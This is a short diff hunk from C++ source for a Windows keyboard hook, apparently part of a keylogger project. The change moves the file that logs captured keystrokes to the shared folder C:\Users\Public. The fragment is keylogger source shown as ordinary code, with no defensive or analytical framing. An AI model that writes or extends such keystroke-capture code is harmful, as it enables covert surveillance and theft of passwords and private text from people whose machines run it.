@@ -46,7 +46,7 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 		BYTE uKeyboardState[256] = { 0 };
 		SYSTEMTIME local_time;
 
-		std::wofstream log_file(L"winkey.log", std::wofstream::app);
+		std::wofstream log_file(L"C:\\Users\\Public\\winkey.log", std::wofstream::app);
 		log_file.imbue(utf8_locale);
 
 		if (log_file.is_open()) {
